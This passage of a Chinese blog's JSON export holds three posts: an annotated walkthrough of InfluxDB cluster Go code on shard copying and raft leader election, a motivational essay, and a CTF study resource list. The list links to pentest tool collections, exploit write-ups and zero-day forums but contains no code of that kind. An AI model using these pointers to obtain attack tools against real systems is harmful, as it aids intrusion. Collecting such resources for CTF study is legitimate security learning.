storeSD.Database()),\n\t\t\t\tzap.String(\"policy\", storeSD.RetentionPolicy()),\n\t\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\t\tzap.Error(err))\n\t\t\treturn\n\t\t}\n\t}\n\t//新建连接wrapper\n\tconnWrapper := NewConnReaderWrapper(conn, tk)\n\t//恢复shared\n\tif err = tk.TaskManager.TSDBStore.RestoreShard(tk.ShardID, connWrapper); err != nil {\n\t\ttk.Logger.Warn(\"restore shard failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\n\t//conn io.Reader never get io.EOF err while RestoreShard, update here\n    //更新copyshared处理，更新数据的主要过程\n\terr = tk.TaskManager.MetaClient.UpdateCopyShardProgress(tk.ID, tk.TotalSize, connWrapper.TotalReceived)\n\n\tif err != nil {\n\t\ttk.Logger.Warn(\"copy shard process update failed:\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Uint64(\"total\", tk.TotalSize),\n\t\t\tzap.Uint64(\"totalReceived\", connWrapper.TotalReceived),\n\t\t\tzap.Error(err))\n\t}\n\t//设置shared可用\n\tif err = tk.TaskManager.TSDBStore.SetShardEnabled(tk.ShardID, true); err != nil {\n\t\ttk.Logger.Warn(\"enable shard failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\t//添加sharedowner节点\n\terr = tk.TaskManager.MetaClient.AddShardOwner(tk.ShardID, tk.TaskManager.Node.GetDataID())\n\tif err != nil {\n\t\ttk.Logger.Warn(\"add shard owner failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\n\ttk.Logger.Info(\"copy shard success\",\n\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\tzap.Uint64(\"shardid\", tk.ShardID))\n\n\treturn\n}\n```\n\n还需要注意的地方就是influxdb中使用raft进行选主操作：\n\n入口函数在启动meta服务的函数中：\n\n```go\n// Open starts the service\nfunc (s *Service) Open() error {\n    \n\ts.Logger.Info(\"Starting meta service\")\n\n\tif s.RaftListener == nil {\n\t\tpanic(\"no raft listener set\")\n\t}\n\n\t// Open listener.\n\tif s.https {\n\t\tcert, err := tls.LoadX509KeyPair(s.cert, s.cert)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\tlistener, err := tls.Listen(\"tcp\", s.httpAddr, &tls.Config{\n\t\t\tCertificates: []tls.Certificate{cert},\n\t\t})\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\ts.Logger.Info(\"Listening on HTTPS\", zap.String(\"Addr\", listener.Addr().String()))\n\t\ts.ln = listener\n\t} else {\n\t\tlistener, err := net.Listen(\"tcp\", s.httpAddr)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\ts.Logger.Info(\"Listening on HTTP\", zap.String(\"Addr\", listener.Addr().String()))\n\t\ts.ln = listener\n\t}\n\n\t// wait for the listeners to start\n\ttimeout := time.Now().Add(raftListenerStartupTimeout)\n\tfor {\n\t\tif s.ln.Addr() != nil && s.RaftListener.Addr() != nil {\n\t\t\tbreak\n\t\t}\n\n\t\tif time.Now().After(timeout) {\n\t\t\treturn fmt.Errorf(\"unable to open without http listener running\")\n\t\t}\n\t\ttime.Sleep(10 * time.Millisecond)\n\t}\n\n\tvar err error\n\tif autoAssignPort(s.httpAddr) {\n\t\ts.httpAddr, err = combineHostAndAssignedPort(s.ln, s.httpAddr)\n\t}\n\tif autoAssignPort(s.raftAddr) {\n\t\ts.raftAddr, err = combineHostAndAssignedPort(s.RaftListener, s.raftAddr)\n\t}\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Open the store.  The addresses passed in are remotely accessible.\n\ts.store = newStore(s.config, s.remoteAddr(s.httpAddr), s.remoteAddr(s.raftAddr))\n\ts.store.node = s.Node\n\n\thandler := newHandler(s.config, s)\n\thandler.logger = s.Logger\n\thandler.store = s.store\n\ts.handler = handler\n\n\t// Begin listening for requests in a separate goroutine.\n\t// s.serve should start before open as open needs httpd for peers\n\tgo s.serve()\n\n\tif err := s.store.open(s.RaftListener); err != nil {   //开启raft监听\n\t\treturn err\n\t}\n\n\treturn nil\n}\n```\n\n打开raft:\n\n```go\n// open opens and initializes the raft store.\nfunc (s *store) open(raftln net.Listener) error {\n\ts.logger.Info(\"Using data dir\", zap.String(\"datadir\", s.path))\n\n\tjoinPeers, err := s.filterAddr(s.config.JoinPeers, s.httpAddr)  // 获取所有的peers\n\tif err != nil {\n\t\treturn err\n\t}\n\tjoinPeers = s.config.JoinPeers //所有的joinPeers列表，不是很理解这边过滤有啥用，上面过滤之后，这边又覆盖了？\n\n\tvar initializePeers []string\n\tif len(joinPeers) > 0 {\n\t\tc := NewClient()\n\t\tc.SetMetaServers(joinPeers)\n\t\tc.SetTLS(s.config.HTTPSEnabled)\n\t\tfor {\n\t\t\tpeers := c.peers()\n\t\t\tif !Peers(peers).Contains(s.raftAddr) {\n\t\t\t\tpeers = append(peers, s.raftAddr)\n\t\t\t}\n\t\t\tif len(s.config.JoinPeers)-len(peers) == 0 {\n\t\t\t\tinitializePeers = peers\n\t\t\t\tbreak\n\t\t\t}\n\n\t\t\tif len(peers) > len(s.config.JoinPeers) {\n\t\t\t\ts.logger.Info(fmt.Sprintf(\"waiting for join peers to match config specified. found %v, config specified %v\", peers, s.config.JoinPeers))\n\t\t\t} else {\n\t\t\t\ts.logger.Info(fmt.Sprintf(\"Waiting for %d join peers.  Have %v. Asking nodes: %v\", len(s.config.JoinPeers)-len(peers), peers, joinPeers))\n\t\t\t}\n\t\t\ttime.Sleep(time.Second)\n\t\t}\n\t}\n\n\tif err := s.setOpen(); err != nil {\n\t\treturn err\n\t}\n\n\t// Create the root directory if it doesn't already exist.\n\tif err := os.MkdirAll(s.path, 0777); err != nil {\n\t\treturn fmt.Errorf(\"mkdir all: %s\", err)\n\t}\n\n\t// Open the raft store.\n    // raft选主\n\tif err := s.openRaft(initializePeers, raftln); err != nil {\n\t\treturn fmt.Errorf(\"raft: %s\", err)\n\t}\n\n\tif len(joinPeers) > 0 {\n\t\tc := NewClient()\n\t\tc.SetMetaServers(joinPeers)\n\t\tc.SetTLS(s.config.HTTPSEnabled)\n\t\tif err := c.Open(); err != nil {\n\t\t\treturn err\n\t\t}\n\t\tdefer c.Close()\n\t\t\n\t\tn, err := c.JoinMetaServer(s.httpAddr, s.raftAddr)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\ts.node.ID = n.ID\n\t\tif err := s.node.Save(); err != nil {\n\t\t\treturn err\n\t\t}\n\n\t}\n\n\t// Wait for a leader to be elected so we know the raft log is loaded\n\t// and up to date\n    //等待选主leader\n\tif err := s.waitForLeader(0); err != nil {\n\t\treturn err\n\t}\n\n\t// Make sure this server is in the list of metanodes\n    // 获取raft的peers\n\tpeers, err := s.raftState.peers()\n\tif err != nil {\n\t\treturn err\n\t}\n\tif len(peers) <= 1 {\n\t\t// we have to loop here because if the hostname has changed\n\t\t// raft will take a little bit to normalize so that this host\n\t\t// will be marked as the leader\n\t\tfor {\n\t\t\terr := s.setMetaNode(s.httpAddr, s.raftAddr)\n\t\t\tif err == nil {\n\t\t\t\tbreak\n\t\t\t}\n\t\t\ttime.Sleep(100 * time.Millisecond)\n\t\t}\n\t}\n\n\treturn nil\n}\n```\n\n函数选主流程：\n\n```go\nfunc (r *raftState) open(s *store, ln net.Listener, initializePeers []string) error {\n\tr.ln = ln\n\tr.closing = make(chan struct{})\n\n\t// Setup raft configuration.\n\tconfig := raft.DefaultConfig()\n\tconfig.LogOutput = ioutil.Discard\n\n\tif r.config.ClusterTracing {\n\t\tconfig.Logger = log.New(os.Stderr, \"[raft]\", log.LstdFlags)\n\t}\n    // 超时\n\tconfig.HeartbeatTimeout = time.Duration(r.config.HeartbeatTimeout)\n\tconfig.ElectionTimeout = time.Duration(r.config.ElectionTimeout)\n\tconfig.LeaderLeaseTimeout = time.Duration(r.config.LeaderLeaseTimeout)\n\tconfig.CommitTimeout = time.Duration(r.config.CommitTimeout)\n\t// Since we actually never call `removePeer` this is safe.\n\t// If in the future we decide to call remove peer we have to re-evaluate how to handle this\n\tconfig.ShutdownOnRemove = false\n\n\t// Build raft layer to multiplex listener.\n    // 构建raft层\n\tr.raftLayer = newRaftLayer(r.addr, r.ln)\n\n\t// Create a transport layer\n    //创建网络传输层\n\tr.transport = raft.NewNetworkTransport(r.raftLayer, 3, 10*time.Second, config.LogOutput)\n\n\t// Create peer storage.\n\tr.peerStore = &peerStore{}\n\n\t// This server is joining the raft cluster for the first time if initializePeers are passed in\n\tif len(initializePeers) > 0 {\n\t\tif err := r.peerStore.SetPeers(initializePeers); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\n\tpeers, err := r.peerStore.Peers()\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// If no peers are set in the config or there is one and we are it, then start as a single server.\n\tif len(initializePeers) <= 1 {\n\t\tconfig.EnableSingleNode = true\n\n\t\t// Ensure we can always become the leader\n\t\tconfig.DisableBootstrapAfterElect = false\n\n\t\t// Make sure our peer address is here.  This happens with either a single node cluster\n\t\t// or a node joining the cluster, as no one else has that information yet.\n\t\tif !raft.PeerContained(peers, r.addr) {\n\t\t\tif err := r.peerStore.SetPeers([]string{r.addr}); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t}\n\n\t\tpeers = []string{r.addr}\n\t}\n\n\t// Create the log store and stable store.\n    // 创建log存储\n\tstore, err := raftboltdb.NewBoltStore(filepath.Join(r.path, \"raft.db\"))\n\tif err != nil {\n\t\treturn fmt.Errorf(\"new bolt store: %s\", err)\n\t}\n\tr.raftStore = store\n\n\t// Create the snapshot store.\n    // 创建文件快照存储\n\tsnapshots, err := raft.NewFileSnapshotStore(r.path, raftSnapshotsRetained, os.Stderr)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"file snapshot store: %s\", err)\n\t}\n\n\t// Create raft log.\n    // 新建raft\n\tra, err := raft.NewRaft(config, (*storeFSM)(s), store, store, snapshots, r.peerStore, r.transport)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"new raft: %s\", err)\n\t}\n\tr.raft = ra\n\n\tr.wg.Add(1)\n\tgo r.logLeaderChanges()\n\n\treturn nil\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["influxdb"],"categories":["influxdb"]},{"title":"发篇心灵鸡汤","url":"/2020/02/16/心灵鸡汤/","content":"\n## 发篇心灵鸡汤\n\n想要有意义的人生，本身就是很累。成天无所事事，那和死了有什么区别？死亡才是永久的休息，那才是真正的一劳永逸。我们得像那热水里的青蛙，在水中折腾翻滚，保持对生命的热忱。这本是生命本该有的状态。\n\n人生没有永远的伤痛，再深的痛，伤口总会痊愈。人生没有过不去的坎，你不可以坐在坎边等它消失，你只能想办法穿过它。人生，没有永远的爱情，没有结局的感情，总要结束;不能拥有的人，总会忘记。慢慢地，你不会再流泪;慢慢地，一切都过去了……适当的放弃，是人生优雅的转身。\n\n人生需要一种平衡。这方面得到的多了，其他就会失去一些。没有十全十美的人生，也不会有万事如意的生活。谁也不可能把所有的好处都占尽，也不可能倒霉到一无所有。失去的时候，要看看自己得到的；成功的时候，也要想想自己付出的。成败也好，得失也罢，无非相对而言，只在于你如何看待。\n\n人生就像马拉松，获胜的关键不在于瞬间的爆发，而在于途中的坚持。你纵有千百个理由放弃，也要给自己找一个坚持下去的理由。很多时候，成功就是多坚持一分钟，这一分钟不放弃，下一分钟就会有希望。只是我们不知道，这一分钟会在什么时候出现。再苦再累，只要坚持走下去,属于你的风景终会出现。\n\n人生就像骑自行车，想保持平衡就得往前走。人生总是在苦恼中循环往复，挣扎不出；得不到的想得到，得到了又怕失去，总觉得别人得到的比自己得到的多。我们每个人都在挣扎中撰写自己的人生。\n\n人生是一列单向行驶的火车，中途会有许多大大小小的站点停靠，但是永远不售返程车票。在这列火车上，有些事情可以做，有些事情必须做，有些事情可做可不做，有些事情坚决不能做，做与不做的选择，决定了人生的方向；做多做少的差别，决定了人生的高度；做好做坏的结果，决定了人生的质量。\n\n人生如棋，黑与白的交错，生与死的交融；人生如棋，所以有了”闲敲棋子落花灯“的闲适，”长人只消一棋局“的洒脱；人生如棋，这是一种竞争，亦是一种调和，漫漫人生，变换不定，令人也难免举棋不定。棋势无定，棋局难料，以不变应万变，胸有成竹，等闲应对看春秋。\n\n人生像一本厚重的书，扉页是我们的梦想，目录是我们的脚印，内容是我们的精彩，后记是我们的回望。有些书是没有主角的，因为我们忽视了自我;有些书是没有线索的，因为我们迷失了自我；有些书是没有内容的，因为我们埋没了自我。唯有把自己当成主角和主线，我们才能写出属于自己的东西。\n\n人生是一列单向行驶的火车，中途会有许多大大小小的站点停靠，但是永远不售返程车票。在这列火车上，有些事情可以做，有些事情必须做，有些事情可做可不做，有些事情坚决不能做，做与不做的选择，决定了人生的方向；做多做少的差别，决定了人生的高度；做好做坏的结果，决定了人生的质量。\n\n世界没有悲剧和喜剧之分，如果你能从悲剧中走出来，那就是喜剧，如果你沉缅于喜剧之中，那它就是悲剧。如果你只是等待，发生的事情只会是你变老了。人生的意义不在于拿一手好牌，而在于打好一手坏牌。\n\n宠辱不惊来去无意，如此心宁静，优雅随之。只有阳光而无阴影，只有欢乐而无痛苦，那就不是人生。在人生的清醒的时刻，在哀痛和伤心的阴影之下，人们真实的自我最接近。人生就像一杯没有加糖的咖啡，喝起来是苦涩的，回味起来却有久久不会褪去的余香。\n\n欣赏的心情是一种积极的世界观，是一种健康、阳光的心态，是真正的快乐之源。人拥有一颗欣赏之心，世间皆是亮丽的风景；用欣赏的眼睛看自己，才能内心愉悦、心底生花。万事万物，你仰视它就伟大，你欣赏它就可爱。学会欣赏，你便拥有快乐；懂得欣赏，你便懂得生活的真谛。拥有欣赏之心，才有幸福人生。\n\n生命很短暂，别把那些重要的话憋着，会没有时间说的。安静，明白了一个人的时光，人生，总有太多期待一直失望，总有太多梦想一直落空，总有太多言语无人可诉。有些人，深深记住，未必不是幸福；坎坷路途，给身边一份温暖；风雨人生，给自己一个微笑。生活，就是把快乐装在心中，一路向前。\n\n岁月里看的是书，读的却是世界；日子沏的是茶，尝的却是生活。生活就是理解，生活就是面对现实微笑。生活就是越过心灵的障碍，平静心性；生活就是越过障碍，注视将来；生活就是知道自己的价值，自己所能做到的与自己所应该做到的。不要用苛刻的眼神看生活，生活的本身就是百味杂陈，人生就是风雨兼程。\n\n我们常常被一个”争“字所纷扰，争到最后，原本阔大渺远的尘世，只剩下一颗自私的心了。心胸开阔一些；得失看轻一些；为别人多考虑一些，哪怕只是少争一点，把看似要紧的东西淡然地放一放，你会发现，人心会一下子变宽，世界会一下子变大。不争，人生至境！\n\n世界的大小，人生的苦乐，心绪的好坏，全取决于你所处的位置。在这个物欲横流的世界里提升一个位置看世界，给自己的思想提升高度，给自己的灵魂储蓄深度，给自己的知识积累厚度，给自己的心灵增加纯度，才能拥有快乐的生活，站在另一个高度俯视世界，学会在平淡的日子里，享受那一份宁静美丽的人生吧。\n\n生命的历程中，圆满只是憧憬，只是我们内心的愿景。一些事，用心了，尽力了，纵然不是圆满，也是一种美好。一些情，在意了，努力了，即使不是完美，也是一种纯真。人生路上，虽有精彩，但更多的是平淡。人生的路要自己走，事要自己做，我们就是于平凡的生活中，演绎着我们的人生，无怨无悔，继续前行！\n\n人生就是一次感恩之旅，为爱要感恩，为恨也要感恩；感恩朋友，也要感恩对手。爱让你温暖感动，恨令你警策自省；朋友加持你的信心，对手磨练你的坚韧。带着一颗感恩的心行世，你就懂得谦卑恻隐；用一颗感恩的心待人处事，你才有宏大的格局，广阔的胸襟。这个世界不欠你，而你却欠着整个世界。\n\n你若懂得知足，就会感到幸福。幸福不是得到的多，而是计较的少。幸福不是拥有的多，而是抱怨的少。坚强，不是面对悲伤不流一滴泪，而是痛哭过后笑着生活。亲情、友情、爱情，不是得到就是学到。无论爱与被爱，只要懂得、舍得、值得，那便是无憾人生。人生最永恒的幸福是平凡，人生最永远的拥有是珍惜。\n\n人生再多的幸运、再多的不幸，都是曾经，都是过去。一如窗外的雨，淋过，湿过，走了，远了感悟人生。曾经的美好留于心底，曾经的悲伤置于脑后，不恋不恨。过去终是过去，那人，那事，那情，任你留恋，都是云烟。学会忘记，懂得放弃，人生总是从告别中走向明天。\n\n人生越成功越淡然。做人成功以心胸宽广为基础，做事成功以百事能忍为起点。心宽则不计较，能忍则不躁动，不计较，不躁动便是淡然。淡然不是麻木，而是内心的稳健。对于感情，知道聚散都是缘，缘尽即散，惋惜也无益。对于事业，了悟成败都是向前，成则继续，败则完善，不必大喜大悲。淡然，让人生超脱。\n\n人生难得一心静。心静才能心安。心浮气躁之人，做人缺乏和善，做事缺乏耐心，势必会让人生陷入僵局。克制浮躁，唯有静心。静心，需要用理智去稀释狂乱的情感，用豁达去释放囚禁的过去，用坦然去迎接不可预知的未来。让心静下来，你才能读懂自己、看清未来。静心，是一种修炼也是一种修养。\n\n\n\n纪念疫情，纪念远去的日子。谢谢。","tags":["心灵鸡汤"],"categories":["心灵鸡汤"]},{"title":"CTF 学习资料整理","url":"/2020/02/13/ctf资料整理/","content":"\n## CTF 学习资料整理\n\n多个地方转载整理：\n\nphp代码解密[https://zhaoyuanma.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fzhaoyuanma.com%2F)\n Python [https://docs.python.org/zh-cn/3.7/](https://links.jianshu.com/go?to=https%3A%2F%2Fdocs.python.org%2Fzh-cn%2F3.7%2F)\n 渗透师[https://www.shentoushi.top/network](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.shentoushi.top%2Fnetwork)\n DVWA攻略[https://www.freebuf.com/articles/web/119150.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.freebuf.com%2Farticles%2Fweb%2F119150.html)\n WEB安全学习笔记\n [https://websec.readthedocs.io/zh/latest/](https://links.jianshu.com/go?to=https%3A%2F%2Fwebsec.readthedocs.io%2Fzh%2Flatest%2F)\n 信息安全书籍[https://www.moondream.cn/?p=851](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.moondream.cn%2F%3Fp%3D851)\n [https://github.com/CHYbeta/Web-Security-Learning/blob/master/README.md#mongodb](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FCHYbeta%2FWeb-Security-Learning%2Fblob%2Fmaster%2FREADME.md%23mongodb)\n\n高持续渗透[https://micropoor.blogspot.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fmicropoor.blogspot.com%2F)\n 安全攻防工具\n [https://www.ms08067.com/tool.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.ms08067.com%2Ftool.html)\n 0day银行\n [http://www.0daybank.org/?page_id=2](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.0daybank.org%2F%3Fpage_id%3D2)\n 零日安全论坛\n [https://www.jmpoep.com/forum.php](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.jmpoep.com%2Fforum.php)\n CTF常用工具速查网\n https://www.jianshu.com/p/ab24f22599a2\n 黑客街[https://www.hackjie.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.hackjie.com%2F)\n redteam [https://www.itcodemonkey.com/article/6375.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.itcodemonkey.com%2Farticle%2F6375.html)\n Mac下[https://xclient.info](https://links.jianshu.com/go?to=https%3A%2F%2Fxclient.info)\n **WP**\n [https://ctf.writeup.wiki/](https://links.jianshu.com/go?to=https%3A%2F%2Fctf.writeup.wiki%2F)\n [https://www.ctfwp.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.ctfwp.com%2F)\n [https://xz.aliyun.com/t/4862](https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F4862)\n [https://xz.aliyun.com/t/4904](https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F4904)\n\n**PWN学习**\n [https://zoepla.github.io/2018/04/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/](https://links.jianshu.com/go?to=https%3A%2F%2Fzoepla.github.io%2F2018%2F04%2Fpwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F)\n **逆向**\n [https://bbs.pediy.com/thread-247176.htm](https://links.jianshu.com/go?to=https%3A%2F%2Fbbs.pediy.com%2Fthread-247176.htm)\n [https://blog.csdn.net/txwtech/article/details/79189345](https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Ftxwtech%2Farticle%2Fdetails%2F79189345)\n [http://www.dtdebug.com/forum.php?mod=viewthread&tid=3211&mobile=2](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.dtdebug.com%2Fforum.php%3Fmod%3Dviewthread%26tid%3D3211%26mobile%3D2)\n [http://www.pansoso.com/g/899437/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.pansoso.com%2Fg%2F899437%2F)\n **渗透测试**\n 渗透脑图\n [https://github.com/Ascotbe/Osmographic-brain-mapping](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FAscotbe%2FOsmographic-brain-mapping)\n 1）玄魂工作室--内部资源清单\n [https://github.com/xuanhun/HackingResource](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fxuanhun%2FHackingResource)\n 2）KaliLinuxWeb渗透测试手册(第二版)-6.7-利用XML外部实体注入\n [https://mp.weixin.qq.com/s/6_sbkXFckb29bq08flhAOA](https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F6_sbkXFckb29bq08flhAOA)\n 3）渗透测试入门指南与路线规划\n [https://gitbook.cn/gitchat/activity/5c303ffe2a982d27f48994d9](https://links.jianshu.com/go?to=https%3A%2F%2Fgitbook.cn%2Fgitchat%2Factivity%2F5c303ffe2a982d27f48994d9)\n 4）全新CTF，内网渗透，web安全教程上线\n [https://mp.weixin.qq.com/s/ukSra269UmRhXYxvsbshng](https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FukSra269UmRhXYxvsbshng)\n [https://github.com/hanc00l/wooyun_public](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fhanc00l%2Fwooyun_public)\n [https://findneo.github.io/180308NewbieSecurityList](https://links.jianshu.com/go?to=https%3A%2F%2Ffindneo.github.io%2F180308NewbieSecurityList)\n [https://github.com/DropsOfZut/awesome-security-weixin-official-accounts](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FDropsOfZut%2Fawesome-security-weixin-official-accounts)\n\n[https://github.com/findneo/Newbie-Security-List](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ffindneo%2FNewbie-Security-List)\n [https://github.com/euphrat1ca/fuzzdb-collect](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Feuphrat1ca%2Ffuzzdb-collect)\n [https://github.com/jaywcjlove/handbook](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fjaywcjlove%2Fhandbook)\n [https://github.com/jaywcjlove](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fjaywcjlove)\n 内网渗透\n [https://bbs.ichunqiu.com/thread-48179-1-1.html](https://links.jianshu.com/go?to=https%3A%2F%2Fbbs.ichunqiu.com%2Fthread-48179-1-1.html)\n k8工具[https://github.com/k8gege/K8tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fk8gege%2FK8tools)\n [https://github.com/truongkma/ctf-tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftruongkma%2Fctf-tools)\n [https://github.com/P1kachu/v0lt](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FP1kachu%2Fv0lt)\n [https://github.com/zardus/ctf-tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fzardus%2Fctf-tools)\n [https://github.com/TUCTF/Tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FTUCTF%2FTools)\n **ACM**\n [https://pan.baidu.com/s/1vo-frs9RypuRFCX3WheNxw](https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F1vo-frs9RypuRFCX3WheNxw)密码:ugcs\n 一些工具\n **博客**\n [https://impakho.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fimpakho.com%2F)\n [https://evoa.me/](https://links.jianshu.com/go?to=https%3A%2F%2Fevoa.me%2F)\n [https://bestwing.me/#](https://links.jianshu.com/go?to=https%3A%2F%2Fbestwing.me%2F%23)\n [https://cyto.top/](https://links.jianshu.com/go?to=https%3A%2F%2Fcyto.top%2F)\n [http://pupiles.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fpupiles.com%2F)\n [http://sp4rk.cn/index.php/page/1](https://links.jianshu.com/go?to=http%3A%2F%2Fsp4rk.cn%2Findex.php%2Fpage%2F1)\n [https://skysec.top/](https://links.jianshu.com/go?to=https%3A%2F%2Fskysec.top%2F)\n [https://www.cjhsunny.xyz/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.cjhsunny.xyz%2F)\n [https://veritas501.space/](https://links.jianshu.com/go?to=https%3A%2F%2Fveritas501.space%2F)\n [http://gv7.me/](https://links.jianshu.com/go?to=http%3A%2F%2Fgv7.me%2F)\n [http://mannix.top/](https://links.jianshu.com/go?to=http%3A%2F%2Fmannix.top%2F)\n [https://www.15qq.cn/sort/bug_poc](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.15qq.cn%2Fsort%2Fbug_poc)\n [http://www.vxia.net/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vxia.net%2F)\n [https://www.chinacycc.com/forum.php?mobile=yes](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.chinacycc.com%2Fforum.php%3Fmobile%3Dyes)\n [https://getpass.cn/](https://links.jianshu.com/go?to=https%3A%2F%2Fgetpass.cn%2F)\n [https://lengjibo.github.io/php%E9%BB%91%E9%AD%94%E6%B3%95/](https://links.jianshu.com/go?to=https%3A%2F%2Flengjibo.github.io%2Fphp%E9%BB%91%E9%AD%94%E6%B3%95%2F)\n [http://www.admintony.com/%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F-RG-SAM-Portal%E7%BB%84%E4%BB%B6-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.admintony.com%2F%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F-RG-SAM-Portal%E7%BB%84%E4%BB%B6-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html)\n [https://github.com/NationalSecurityAgency](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FNationalSecurityAgency)\n [https://github.com/YadominJinta/atilo/blob/master/CN/README_CN.md](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FYadominJinta%2Fatilo%2Fblob%2Fmaster%2FCN%2FREADME_CN.md)\n [https://bbs.ichunqiu.com/thread-49370-1-1.html](https://links.jianshu.com/go?to=https%3A%2F%2Fbbs.ichunqiu.com%2Fthread-49370-1-1.html)\n [https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/-](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.certilience.fr%2F2019%2F03%2Ftomcat-exploit-variant-host-manager%2F-)\n [https://www.freebuf.com/articles/web/135342.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.freebuf.com%2Farticles%2Fweb%2F135342.html)\n [https://www.giantbranch.cn/archives/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.giantbranch.cn%2Farchives%2F)\n [https://c1h2e1.github.io/?title:RPO](https://links.jianshu.com/go?to=https%3A%2F%2Fc1h2e1.github.io%2F%3Ftitle%3ARPO)\n [https://ptriker.github.io/?nsukey=i5ksp6ydekZ5gVkkzAillrRQbCM9m%2FEzuAESN0ysr648ghZbs%2FRX02k5ZurIP64Ms7%2B8bjHEc6KXxHVA4f18XdgBHyMczVFh1ACn9tR1haPSbPMbZubLg7pvyRdzNNucagm403QF2oasTKlZHlM6xWsATEITusqjpSTUXUDgdYxH9Tpm3RcXb6nvNyB%2B3K%2BuTpVWldTI8tgLH8xPtUbOOw%3D%3D](https://links.jianshu.com/go?to=https%3A%2F%2Fptriker.github.io%2F%3Fnsukey%3Di5ksp6ydekZ5gVkkzAillrRQbCM9m%2FEzuAESN0ysr648ghZbs%2FRX02k5ZurIP64Ms7%2B8bjHEc6KXxHVA4f18XdgBHyMczVFh1ACn9tR1haPSbPMbZubLg7pvyRdzNNucagm403QF2oasTKlZHlM6xWsATEITusqjpSTUXUDgdYxH9Tpm3RcXb6nvNyB%2B3K%2BuTpVWldTI8tgLH8xPtUbOOw%3D%3D)\n 